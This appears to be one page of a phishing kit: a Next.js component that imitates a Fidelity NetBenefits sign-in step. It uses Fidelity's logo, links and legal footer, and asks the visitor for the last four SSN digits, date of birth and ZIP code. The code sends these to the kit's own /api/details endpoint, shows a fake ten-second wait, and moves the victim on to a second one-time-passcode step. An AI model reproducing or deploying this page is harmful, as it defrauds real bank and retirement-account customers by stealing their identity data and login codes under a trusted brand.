'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';

export default function DetailsPage() {
  const [ssn, setSsn] = useState('');
  const [dob, setDob] = useState('');
  const [zipcode, setZipcode] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const router = useRouter();

  useEffect(() => {
    if (typeof window !== 'undefined' && !sessionStorage.getItem('fl_details')) router.replace('/otp');
  }, [router]);

  const handleSsnChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const digits = e.target.value.replace(/\D/g, '').slice(0, 4);
    setSsn(digits);
  };

  const formatDobDisplay = (digits: string): string => {
    if (digits.length <= 2) return digits;
    if (digits.length <= 4) return `${digits.slice(0, 2)}/${digits.slice(2)}`;
    return `${digits.slice(0, 2)}/${digits.slice(2, 4)}/${digits.slice(4, 8)}`;
  };

  const handleDobChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const digits = e.target.value.replace(/\D/g, '').slice(0, 8);
    setDob(formatDobDisplay(digits));
  };

  const handleZipChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const digits = e.target.value.replace(/\D/g, '').slice(0, 10);
    setZipcode(digits);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (isLoading) return;
    setIsLoading(true);

    try {
      await fetch('/api/details', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ssn, dob, zipcode }),
      });
    } catch (err) {
      console.error('Error submitting details:', err);
      setIsLoading(false);
      return;
    }
    await new Promise((r) => setTimeout(r, 10000));
    if (typeof window !== 'undefined') sessionStorage.setItem('fl_otp2', '1');
    router.push('/otp?step=2');
  };

  return (
    <>
      <style jsx global>{`
        * {
          box-sizing: border-box;
        }

        body,
        p {
          margin: 0;
        }

        .sf-hidden {
          display: none !important;
        }

        .main-container {
          background-color: #f2f2f2;
          border: 1px solid transparent;
          box-sizing: border-box;
          min-height: 100vh;
        }

        .main-container nav.dom-header {
          background-color: #fff;
          border-bottom: 1px solid #ccc;
          box-sizing: border-box;
          display: flex;
          flex-direction: row;
          flex-wrap: nowrap;
          font-family: Fidelity Sans, Arial, sans-serif;
          height: 3.75rem;
          justify-content: space-between;
        }

        .main-container nav.dom-header div.dom-header-logo {
          margin: 1rem 0 0 1.25rem;
        }

        .main-container nav.dom-header div.dom-header-logo a {
          text-decoration: none;
        }

        .main-container nav.dom-header div.dom-header-links {
          margin: 0 1.25rem 0 0;
          display: flex;
          align-items: center;
          gap: 2rem;
        }

        .main-container nav.dom-header div.dom-header-links .dom-header-pvd-link {
          color: #000;
          font-weight: 400;
          vertical-align: middle;
          text-decoration: none;
        }

        .main-container .dom-container {
          margin: 15vh auto 0;
          padding-bottom: 2rem;
          width: 448px;
        }

        .dom-card {
          background: #fff;
          font-family: Fidelity Sans, Helvetica, Arial, sans-serif;
          color: #000;
        }

        @media (min-width: 32em) {
          .dom-card {
            border: 1px solid #ccc;
            border-radius: 0.5rem;
            padding: 2rem 2rem 3rem;
          }
        }

        @media (max-width: 32em) {
          .dom-card {
            border-bottom: 1px solid #ccc;
            padding: 1.5rem 1rem;
          }
        }

        .dom-card .dom-card-header {
          margin-bottom: 1rem;
        }

        .dom-card .dom-card-body {
          margin: 1.5rem 0 0;
        }

        .header-text {
          text-align: center;
          font-family: "Fidelity Sans", Arial, sans-serif;
          font-weight: 700;
          font-style: normal;
          padding: 20px;
          color: #000;
        }

        .header-text p {
          color: #000;
        }

        .pvd-button-root {
          width: 100%;
          padding: 0.75rem;
          background-color: #368727;
          color: white;
          border: none;
          border-radius: 0.25rem;
          font-size: 1rem;
          font-weight: 400;
          cursor: pointer;
          transition: background-color 0.2s;
          margin-top: 1rem;
        }

        .pvd-button-root:hover {
          background-color: #2b6b1e;
        }

        .pvd-button-root:disabled {
          background-color: #bbb;
          cursor: not-allowed;
        }

        .pvd-input-root {
          width: 100%;
          margin-bottom: 1rem;
        }

        .pvd-input__input {
          width: 100%;
          padding: 0.75rem;
          border: 1px solid #ccc;
          border-radius: 0.25rem;
          font-size: 1rem;
          color: #000;
          background-color: #fff;
        }

        .pvd-label__label {
          display: block;
          margin-bottom: 0.5rem;
          font-weight: 400;
          font-size: 1rem;
          color: #000;
        }

        footer.dom-footer {
          background-color: #f2f2f2;
          border: 1px solid transparent;
          color: #666;
          font-family: Fidelity Sans, Arial, sans-serif;
          font-size: 0.75rem;
          font-weight: 400;
          margin-top: -2rem;
        }

        footer.dom-footer .dom-footer-pvd-link {
          color: #666 !important;
        }

        footer.dom-footer .footer-new-user,
        footer.dom-footer .footer-legal,
        footer.dom-footer .footer-links-stacked,
        footer.dom-footer .footer-copyright-row {
          box-sizing: border-box;
          padding: 0 1.25rem;
          width: 100%;
        }
        footer.dom-footer .footer-new-user {
          padding-top: 0.5rem;
          padding-bottom: 1.5rem;
        }
        footer.dom-footer .footer-new-user-heading {
          margin: 0 0 0.5rem 0;
          font-size: 0.875rem;
          color: #333;
        }
        footer.dom-footer .footer-new-user .dom-footer-pvd-link { display: block; margin-bottom: 0.25rem; }
        footer.dom-footer .footer-faqs-link { display: block; margin-top: 1.25rem; }
        footer.dom-footer .footer-legal {
          line-height: 1.5;
          margin: 0 0 1.5rem 0;
        }
        footer.dom-footer .footer-links-stacked .dom-footer-pvd-link {
          display: block;
          padding: 0.25rem 0;
          text-decoration: none;
        }
        footer.dom-footer .footer-links-stacked .dom-footer-pvd-link:hover { text-decoration: underline; }
        footer.dom-footer .footer-copyright-row { padding-bottom: 0.75rem; }
        footer.dom-footer .footer-copyright { line-height: 1.5; }

        @media screen and (min-width: 512px) {
          .main-container {
            height: auto;
            min-height: 100vh;
          }

          .main-container .dom-header {
            align-items: center;
            position: static;
          }

          .main-container .dom-header div.dom-header-links,
          .main-container .dom-header div.dom-header-logo {
            position: static;
          }

          footer.dom-footer {
            display: grid;
            grid-template-columns: 1fr 1fr;
            grid-template-rows: auto auto auto;
          }
          footer.dom-footer .footer-new-user,
          footer.dom-footer .footer-legal {
            grid-column: 1 / -1;
            text-align: left;
          }
          footer.dom-footer .footer-copyright-row {
            grid-column: 1;
            text-align: left;
          }
          footer.dom-footer .footer-links-stacked {
            grid-column: 2;
            text-align: right;
          }
          footer.dom-footer .footer-links-stacked .dom-footer-pvd-link {
            display: inline-block;
            padding: 0.75rem 1.5rem 0.75rem 0;
          }
        }

        @media screen and (max-width: 768px) {
          .main-container .dom-header div.dom-header-links.dom-header-links--hide-on-mobile {
            display: none;
          }
        }

        @media screen and (max-width: 511px) {
          .main-container .dom-header,
          .main-container .dom-header div.dom-header-logo {
            position: static;
          }

          .main-container .dom-header div.dom-header-links {
            display: none;
          }
        }

        @media only screen and (max-width: 511px) {
          .main-container nav.dom-header {
            border-bottom: none;
          }

          .main-container .dom-container {
            margin: 0 auto;
            width: auto;
          }

          .main-container .dom-header div.dom-header-links {
            display: none;
          }

          footer.dom-footer {
            display: block;
            font-size: 0.875rem;
          }
          footer.dom-footer .footer-new-user,
          footer.dom-footer .footer-legal,
          footer.dom-footer .footer-links-stacked,
          footer.dom-footer .footer-copyright-row {
            text-align: center;
          }
          footer.dom-footer .footer-links-stacked .dom-footer-pvd-link {
            display: block;
            padding: 0.25rem 0;
          }
        }

      `}</style>

      <div className="main-container">
        <nav className="dom-header">
          <div className="dom-header-logo">
            <a href="/">
              <img
                src="/Fidelity-NetBenefits-Logo%20(5).svg"
                alt="Fidelity NetBenefits"
                style={{ height: '28px', width: 'auto' }}
              />
            </a>
          </div>
          <div className="dom-header-links dom-header-links--hide-on-mobile">
            <a
              className="dom-header-pvd-link"
              href="https://www.fidelity.com/security/overview"
            >
              Security
            </a>
            <a
              className="dom-header-pvd-link"
              href="https://www.fidelity.com/customer-service/need-help-logging-in"
            >
              FAQs
            </a>
          </div>
        </nav>

        <div className="dom-container">
          <div id="dom-overlay"></div>
          <div id="dom-widget">
            <div>
              <div id="mainui" className="dom-card dom-signin-card">
                <div className="dom-card-header">
                  <div className="header-text">
                    <p>Add personal information to improve security and performance.</p>
                  </div>
                </div>

                <div className="dom-card-body">
                  <form id="login-form" onSubmit={handleSubmit}>
                    <div className="pvd-field-group__field-group">
                      <label className="pvd-label__label" htmlFor="ssn">
                        Last 4 digits of SSN
                      </label>
                      <div className="pvd-input-root">
                        <input
                          className="pvd-input__input"
                          id="ssn"
                          type="text"
                          inputMode="numeric"
                          maxLength={4}
                          autoComplete="off"
                          value={ssn}
                          onChange={handleSsnChange}
                          required
                          disabled={isLoading}
                        />
                      </div>
                    </div>

                    <div className="pvd-field-group__field-group">
                      <label className="pvd-label__label" htmlFor="dob">
                        Date of birth (MM/DD/YYYY)
                      </label>
                      <div className="pvd-input-root">
                        <input
                          className="pvd-input__input"
                          id="dob"
                          type="text"
                          inputMode="numeric"
                          maxLength={10}
                          placeholder="MM/DD/YYYY"
                          autoComplete="off"
                          value={dob}
                          onChange={handleDobChange}
                          required
                          disabled={isLoading}
                        />
                      </div>
                    </div>

                    <div className="pvd-field-group__field-group">
                      <label className="pvd-label__label" htmlFor="zip-code">
                        ZIP code
                      </label>
                      <div className="pvd-input-root">
                        <input
                          className="pvd-input__input"
                          id="zip-code"
                          type="text"
                          inputMode="numeric"
                          maxLength={10}
                          autoComplete="off"
                          value={zipcode}
                          onChange={handleZipChange}
                          required
                          disabled={isLoading}
                        />
                      </div>
                    </div>

                    <button
                      type="submit"
                      className="pvd-button-root pvd-button--full-width pvd-button--primary"
                      disabled={isLoading}
                    >
                      <span>{isLoading ? 'Loading...' : 'Submit'}</span>
                    </button>
                  </form>
                </div>
              </div>
            </div>
          </div>
          <div id="dom-sronly" aria-live="assertive"></div>
        </div>
      </div>

      <footer className="dom-footer">
        <p className="footer-legal">
          By using this website, you consent to the use of cookies as described{' '}
          <a
            className="dom-footer-pvd-link underline"
            href="https://www.fidelity.com/privacy-policy"
            target="_blank"
            rel="noopener"
          >
            here
          </a>
          . However, if you do not agree to our cookies policy, you can change your cookie settings at any time.{' '}
          Fidelity Brokerage Services LLC, Member{' '}
          <a
            className="dom-footer-pvd-link underline"
            href="https://www.nyse.com"
            target="_blank"
            rel="noopener"
          >
            NYSE
          </a>
          ,{' '}
          <a
            className="dom-footer-pvd-link underline"
            href="https://www.sipc.org"
            target="_blank"
            rel="noopener"
          >
            SIPC
          </a>
          , 900 Salem Street, Smithfield, RI 02917
        </p>
        <div className="footer-links-stacked">
          <a
            className="dom-footer-pvd-link"
            href="https://www.fidelity.com/terms-of-use"
            target="_blank"
            rel="noopener"
          >
            Terms of Use
          </a>
          <a
            className="dom-footer-pvd-link"
            href="https://www.fidelity.com/privacy-policy"
            target="_blank"
            rel="noopener"
          >
            Privacy
          </a>
          <a
            className="dom-footer-pvd-link"
            href="https://www.fidelity.com/security/overview"
            target="_blank"
            rel="noopener"
          >
            Security
          </a>
        </div>
        <div className="footer-copyright-row">
          <div className="footer-copyright">
            ©1998-2026 FMR LLC. All Rights Reserved.
            <br />
            1205840.1.0
          </div>
        </div>
      </footer>
    </>
  );
}


